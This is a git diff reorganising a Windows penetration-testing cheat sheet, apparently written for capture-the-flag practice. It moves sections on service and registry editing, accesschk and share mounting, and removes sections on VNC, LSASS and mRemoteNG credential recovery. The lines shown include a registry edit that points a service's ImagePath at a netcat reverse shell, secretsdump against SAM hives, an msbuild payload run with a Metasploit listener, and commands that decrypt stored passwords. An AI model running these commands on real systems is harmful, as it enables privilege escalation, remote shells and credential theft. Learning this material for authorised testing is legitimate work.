@@ -63,8 +63,22 @@ Start-BitsTransfer -Source <url> -Destination <output_file>
 certutil -urlcache -f <url> output_file<>
 ```
 
+## Services
+```bat
+:: Get info
+sc query <service>
+reg query HKLM\System\CurrentControlSet\Services\<service>
 
-# Directories to check
+:: Edit info
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v <value> /d <data> /f
+
+:: Edit ImagePath and execute netcat command (assuming nc was uploaded before)
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v ImagePath /d "nc.exe <ip> <port> -e powershell.exe" /f
+```
+
+
+
+# Directories
 ```bash
 # Powershell history log file
 C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -84,6 +98,61 @@ C:\Windows\System32\config
 # AD database file location
 C:\Windows\NTDS
 ```
+
+## Configuration files
+Most config files can be found in `C:\Windows\System32\config`     
+
+### Get info from registry hive
+```bash
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+## Mount windows shares and VHD files
+The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
+```bash
+mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
+```
+
+### Mount VHD files
+One can use `guestmount` to mount a guest filesystem on the host.     
+Install with: `apt install libguestfs-tools`
+
+```bash
+guestmount --add <vhd_file> --inspector --ro <mount_dir>
+```
+
+#### References
+- [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)
+
+
+
+# accesschk
+AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.      
+
+```bat
+:: Accept eula
+accesschk.exe /accepteula
+
+:: Access to services
+accesschk.exe <user> -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
+
+:: Services access
+accesschk.exe -uwcqv Users *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+
+:: Weak folder permission per drive
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+accesschk.exe -uwdqs "Everyone" c:\
+
+```    
+- [Github](https://github.com/ankh2054/windows-pentest).**  
+
+
+## Example usage in CTF situations
+- [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
+- [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)
 
 
 
@@ -106,128 +175,18 @@ set lhost <ip>
 sel lport <port>
 generate
 ```
-Now start the lister with `msfconsole -r file.rc` and execute the xml payload with:
+Now start the listener with `msfconsole -r file.rc` and execute the xml payload with:
 ```powershell
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
 
 ## References
 - [https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct](https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct)
-
-
-# accesschk.exe
-AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.      
-
-**Download from [here](https://github.com/ankh2054/windows-pentest).**  
-```bat
-:: Accept eula
-accesschk.exe /accepteula
-
-:: Access to services
-accesschk.exe <user> -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
-
-:: Services access
-accesschk.exe -uwcqv Users *
-accesschk.exe -uwcqv "Authenticated Users" *
-accesschk.exe -uwcqv "Everyone" *
-
-:: Weak folder permission per drive
-accesschk.exe -uwdqs Users c:\
-accesschk.exe -uwdqs "Authenticated Users" c:\
-accesschk.exe -uwdqs "Everyone" c:\
-```    
-
-## Edit service
-```bat
-:: Get info
-sc query <service>
-reg query HKLM\System\CurrentControlSet\Services\<service>
-
-:: Edit info
-reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v <value> /d <data> /f
-
-:: Edit ImagePath and execute netcat command (assuming nc was uploaded before)
-reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v ImagePath /d "nc.exe <ip> <port> -e powershell.exe" /f
-```
-
-## References
-- [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
-- [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)
+- [https://github.com/GreatSCT/GreatSCT.git](https://github.com/GreatSCT/GreatSCT.git)
 
 
 
-# Config files
-Most config files can be found in `C:\Windows\System32\config`     
-
-## Get info from registry hive
-```bash
-secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
-```
-
-
-# Mount windows shares and VHD files
-The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
-```bash
-mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
-```
-
-## Mount VHD files
-One can use `guestmount` to mount a guest filesystem on the host.     
-Install with: `apt install libguestfs-tools`
-
-```bash
-guestmount --add <vhd_file> --inspector --ro <mount_dir>
-```
-
-### References
-- [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)
-
-
-
-# VNC passwords
-## Bash
-VNC stores passwords as a hex string in `.vnc` files using a default encryption key
-```bash
-# Decrypt password
-echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
-```
-
-## vncpasswd.py
-[Documentation](https://github.com/trinitronx/vncpasswd.py)
-```bash
-python vncpasswd.py -d -f <hashfile>
-
-```   
-## References
-- [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
-- [https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)
-- [https://github.com/trinitronx/vncpasswd.py](https://github.com/trinitronx/vncpasswd.py)
-
-
-# Softwares / Processes
-## LSASS process
-Local Security Authority Server Service is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system     
-**From these processes, one might be able to harvest credentials from process's dump file**
-
-### Dump
-**[Documentation](https://github.com/skelsec/pypykatz)**
-```bash
-pypykatz lsa minidump <lsass_dump_file>
-``` 
-
-## References
-- [https://attack.mitre.org/techniques/T1003/001/](https://attack.mitre.org/techniques/T1003/001/)
-
-## mRemoteNG
-mRemoteNG is a remote connection management tool, it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:
-
-### confCons.xml
-One can use **[mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)** to crack the password from the config file.     
-```bash
-python3 mremoteng_decrypt.py -s <string>
-```
-
-# Analyse office files
+# Office files
 Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
 ```bash
 unzip <file>
@@ -241,8 +200,3 @@ sudo pip3 install -U oletools
 # Extract macros
 olevba -c <file>
 ```
-
-# OS command injection
-Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
-## References
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
